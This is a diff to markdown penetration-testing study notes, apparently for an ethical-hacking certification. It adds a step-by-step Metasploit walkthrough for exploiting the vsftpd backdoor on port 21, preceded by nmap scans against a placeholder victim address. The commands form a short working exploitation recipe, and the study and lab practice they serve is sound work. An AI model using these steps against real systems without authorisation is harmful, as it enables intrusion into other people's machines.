@@ -52,6 +52,7 @@ ping <ip_pentester>
 ```
 nmap -F <ip_victim>
 ```
+
 * Finding host and scanning network 
 learning.oreilly.com/library/view/ceh-certified-ethical
 
@@ -125,4 +126,28 @@ OR
 ```
 exploit
 ```
-
+* Testing backdoor vsftpd : 
+```
+nmap -sV -p 21 <ip_victim>
+```
+search the exploit : 
+```
+msfconsole
+```
+```
+search vsftpd
+```
+run exploit : 
+```
+```
+use 1
+```
+```
+set rhosts <ip_victim>
+```
+```
+set rport 21
+```
+```
+exploit
+```
